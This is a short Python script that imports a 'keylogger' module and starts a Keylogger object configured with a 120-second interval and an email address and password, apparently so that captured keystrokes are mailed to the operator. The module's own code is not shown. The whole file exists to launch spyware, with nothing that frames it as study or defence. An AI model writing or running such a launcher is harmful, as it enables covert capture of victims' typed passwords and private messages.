#!/usr/bin/env python

import keylogger

try:
    logger = keylogger.Keylogger(120,"myemail@gmail.com", "emailpassword")
    logger.start()
except KeyboardInterrupt:
    print()
